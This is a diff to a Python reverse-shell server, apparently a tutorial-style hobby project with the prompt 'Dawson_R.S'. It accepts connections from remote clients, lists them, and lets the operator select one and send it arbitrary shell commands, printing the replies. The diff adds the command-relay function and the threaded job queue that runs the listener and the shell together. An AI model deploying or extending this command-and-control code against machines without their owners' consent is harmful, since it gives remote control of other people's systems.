@@ -1,8 +1,12 @@
+#TODO: Refactor and create Server class
+
 import socket
-import sys
+import os
 import time
 import threading
 from queue import Queue
+
+
 
 NUM_THREADS = 2
 JOB_NUM = [1,2]
@@ -57,7 +61,7 @@ def connection_accept():
             conn.setblocking(1)
             all_connections.append(conn)
             all_addresses.append(address)
-            print("\n Connection has been established with :" + address[0] + "at Port: " + str(address[1]))
+            print("\n Connection has been established with " + address[0] + " at Port: " + str(address[1]))
         except:
             print("Error accepting connection from client")
 
@@ -66,15 +70,23 @@ def connection_accept():
 
 def start_custom_shell():
     while 1:
+
         command = input("Dawson_R.S/> ")
-        if command == 'list':
+
+        if len(command.strip()) == 0:
+            continue
+        elif command == 'exit':
+            print("Terminating Program...")
+            os._exit(0)
+        elif command == 'list':
             list_connections()
         elif 'select' in command:
             conn = get_target(command)
             if conn is not None:
                 send_target_commands(conn)
         else:
-            print(str(command) + "is not a recognized command")
+            print(str(command) + " is not a recognized command")
+
 
 # Display all current connections
 
@@ -99,15 +111,66 @@ def get_target(command):
     try:
         target = int(command.replace('select ', ''))
         conn = all_connections[target]
-        print("Server has connected to " + str(all_addresses[target][0] + ' at Port ' +  str(all_addresses[target][0])))
+        print("Server has connected to " + str(all_addresses[target][0] + ' at Port ' +  str(all_addresses[target][1])))
         print("Dawson_R.S@"+str(all_addresses[target][0]) + "> ", end='')
         return conn
     except:
         print("Not a valid connection. Please enter a valid index number")
         return None
-    
+
+# Connect with remote client
 
 
+def send_target_commands(conn):
+
+    while True:
+        try:
+            command  = input()
+            if command == 'quit':
+                print("Closing connection with client")
+                break
+            elif len(str.encode(command)) > 0:
+                conn.send(str.encode(command))
+                client_response = str(conn.recv(20480), 'utf-8')
+                print(client_response, end='')
+
+        except:
+            print("Connection to client lost...")
+            break
 
 
+# Create Threads
 
+def create_threads():
+    for _ in range(NUM_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+
+# Do next job in queue ( one to handle connections, one to send commands)
+
+
+def work():
+    while True:
+
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            connection_accept()
+        if x == 2:
+            start_custom_shell()
+        queue.task_done()
+
+#  Create jobs
+
+
+def create_jobs():
+    for x in JOB_NUM:
+        queue.put(x)
+    queue.join()
+
+
+create_threads()
+create_jobs()
